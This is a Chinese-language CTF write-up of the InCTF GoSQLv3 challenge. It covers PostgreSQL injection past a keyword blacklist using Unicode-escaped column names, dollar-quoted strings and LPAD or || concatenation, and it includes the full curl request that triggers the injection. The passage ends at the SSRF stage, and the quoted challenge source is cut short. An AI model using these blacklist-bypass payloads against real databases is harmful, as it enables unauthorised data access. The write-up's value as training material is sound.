## 长文慎读
在本文中，我将分享在[teambi0s](https://twitter.com/teambi0s)'s
[InCTF](https://ctftime.org/ctf/31)
的GoSQLv3挑战中所面临的问题以及是如何解决的，我还将分享所有'无效'的技巧和测试，我认为这与实际的解决方案一样重要，因为它们可以在其他情况下起到作用。  
如果您认为有任何问题，请随时通过[Twitter](https://twitter.com/jorge_ctf)或[Telegram](https://t.me/jorgectf)与我联系。让我们开始吧！
## GoSQLv3
这项挑战基于PostgreSQL注入，该注入以（非常噩梦的）黑名单为条件，其后是SSRF，允许我们向数据库引擎发出Gopher请求。
## SQL注入
挑战代码：
    |You are not admin " . "";
      }
    }
    }else{
    echo "Having a query problem" . "";
    }
    highlight_file(__FILE__);
    ?>
如代码所示，该PHP代码使用config.php来连接数据库，请求参数name和columns使用定义的$blacklist来过滤，最后执行查询，页面将跳转到下一页。  
让我们从查询的第一个变量column开始，为了更好的测试我将使用真实环境的PostgreSQL数据引擎，另外一个很好的选择是[这里](https://sqliteonline.com/)
## column
据我所知，在PostgreSQL查询中有两种方式申明列名，第一种是使用大家公认的方法（列名没有被双引号包裹），而另一种是PostgresSQL独有的（列名被双引号包裹）  
没有双引号示例如下：
    testdb=# SELECT testcolumn;
    ERROR:  column "testcolumn" does not exist
有双引号示例如下：
    testdb=# SELECT "testcolumn";
    ERROR:  column "testcolumn" does not exist
以下细节是关键，因为我们将把列名定义为UTF-16编码。根据PostgreSQL的[官方文档](https://www.postgresql.org/docs/9.2/sql-syntax-lexical.html#SQL-SYNTAX-STRINGS-UESCAPE)有如下语法（[在线编码转换网站](https://www.branah.com/unicode-converter)）
    test -> \u0074\u0065\u0073\u0074 -> U&'\0074\0065\0073\0074'
运行结果如下：
    testdb=# SELECT U&'\0074\0065\0073\0074';
     ?column?
    ----------     test
    (1 row)`
因此，如果一切正常，为什么数据库返回一个字符串而不是列名？这就是为什么双引号这个“东西”是关键的原因。
    testdb=# SELECT U&\0074\0065\0073\0074;
    invalid command \0074
    testdb=# SELECT U&'\0074\0065\0073\0074';
     ?column?
    ----------     test
    (1 row)
    testdb=# SELECT U&"\0074\0065\0073\0074";
    ERROR:  column "test" does not exist
最好的总结就是：在SELECT语句后面，没有双引号包裹或者有被双引号包裹的字符串代表列名，而被单引号包裹的字符串总是代表字符串。  
有了上述信息，我们可以创建第一部分的查询语句：
    testdb=# SELECT U&"\0075\0073\0065\0072\006e\0061\006d\0065",U&"\0067\006f\005f\0074\006f";
    ERROR:  column "username" does not exist
但这并没有多大用处，因为我们没有足够的信息来验证我们的payload会成功，因此让我们创建一个简单的表并包含那个列。
    testdb=# CREATE TABLE inctf2020 (id int, username text, go_to text);
    CREATE TABLE
因为我们知道数据库中一个存在的值，最好也插入这个值
    testdb=# INSERT INTO inctf2020 VALUES (1, 'admin', 'secret_place');
    INSERT 0 1
    testdb=# SELECT * FROM inctf2020;
     id | username |    go_to
    ----+----------+--------------      1 | admin    | secret_place
    (1 row)
现在我们继续测试payload
    testdb=# SELECT U&"\0075\0073\0065\0072\006e\0061\006d\0065",U&"\0067\006f\005f\0074\006f" FROM inctf2020;
     username |    go_to
    ----------+--------------     admin    | secret_place
    (1 row)
成功了，我们成功的从指定的UTF-16编码的列名中查询到了所有的东西。  
不幸的是，由于这是我在参加AWAE之前研究的字符限制绕过技术之一，因此我很快就完成了注入的这一部分，因此这里没有多余的技巧/尝试。
## name
因为在目标列名的查询中返回了'admin',因此这个阶段的目标是'写admin'， 看起来就像手写’admin'一样容易，但是恶魔般的黑名单又出现了。
    $blacklist  = "adm|min|\'|...
这是在检查字符串是否包含' adm '，' min
'和'。由于我们在这里没有太多选择，所以我通常参考[String函数文档](https://www.postgresql.org/docs/9.1/functions-string.html)，并开始寻找可以帮助我们构建这样的字符串的方法。
## 双$字符串
在寻找函数连接'admin'之前，我们需要找到一种方法不带单引号来声明字符串。应该很容易，不是吗？
    testdb=# SELECT U&"\0075\0073\0065\0072\006e\0061\006d\0065",U&"\0067\006f\005f\0074\006f" FROM inctf2020 WHERE username = "admin";
    ERROR:  column "admin" does not exist
    testdb=# SELECT U&"\0075\0073\0065\0072\006e\0061\006d\0065",U&"\0067\006f\005f\0074\006f" FROM inctf2020 WHERE username = admin;
    ERROR:  column "admin" does not exist
正如我们之前所看到的，声明字符串的唯一方法是用单引号包围它们。那么我们该如何声明呢？显然，根据[Postgres文档](https://www.postgresql.org/docs/8.1/sql-syntax.html#4.1.2.2.%20Dollar-Quoted%20String%20Constants)，可以使用双美元符号
($)将字符串括起来.
    testdb=# SELECT 'test';
     ?column?
    ----------     test
    (1 row)
    testdb=# SELECT $$test$$;
     ?column?
    ----------     test
    (1 row)
因此，我们现在准备找到一个函数来连接字符串' admin '。
## LPAD功能
通过此功能，我们可以按字面意思“ 使用指定的字符来填充字符串至长度等于length。如果字符串已经长于length，那么它将被截断（在右侧）。”
    testdb=# SELECT LPAD('world', 10, 'hello');
        lpad
    ------------     helloworld
    (1 row)
这就是我们连接“ admin ”的每个字符所需要的一切。（并不严格要求连接每个字符，但最好进行练习，以防我们再次需要它）
这就是我们最终得到的：
    testdb=# SELECT LPAD('n', 5, LPAD('i', 4, LPAD('m', 3, LPAD('d', 2, LPAD('a', 1, '')))));
    -------     admin
    (1 row)
好了！现在查询将返回我们想要的内容。
## '||' 字符连接
但是，在Postgres中是否没有另一种（更容易的）串联字符串的方法？是的（戳[这里](https://stackoverflow.com/questions/35797709/why-is-used-as-string-concatenation-in-postgresql-redshift)）。但是，我们将再次使用之前的一种技术。
    $ python3 -c 'print("||".join("$$"+i+"$$" for i in "admin"))'
    $$a$$||$$d$$||$$m$$||$$i$$||$$n$$
    testdb=# SELECT $$a$$||$$d$$||$$m$$||$$i$$||$$n$$;
     ?column?
    ----------     admin
    (1 row)
## 获取secret的位置
让我们提交查询以获取下一个阶段的URL。
    $ curl -I 'http://MIRROR/?column=U&"\0075\0073\0065\0072\006e\0061\006d\0065",U&"\0067\006f\005f\0074\006f"&name=$$a$$||$$d$$||$$m$$||$$i$$||$$n$$'
    HTTP/1.1 200 OK
    Date: Sun, 02 Aug 2020 18:11:43 GMT
    Server: Apache/2.4.18 (Ubuntu)
    Content-Type: text/html; charset=UTF-8
嗯，看来我们缺少了某些东西……或者实际上没有。后端采用了两个以上的$_GET参数，因为＆符号没有经过URL编码，将代表新的GET参数，对&进行URL编码如下。  
& -> (URL 编码) -> %26
    $ curl -I 'http://MIRROR/?column=U%26"\0075\0073\0065\0072\006e\0061\006d\0065",U%26"\0067\006f\005f\0074\006f"&name=$$a$$||$$d$$||$$m$$||$$i$$||$$n$$'
    HTTP/1.1 302 Found
    Date: Sun, 02 Aug 2020 18:14:03 GMT
    Server: Apache/2.4.18 (Ubuntu)
    Location: ./feel_the_gosql_series.php
    Content-Type: text/html; charset=UTF-8
好了！我们要跟随的连链接是feel_the_gosql_series.php。
## SSRF 方法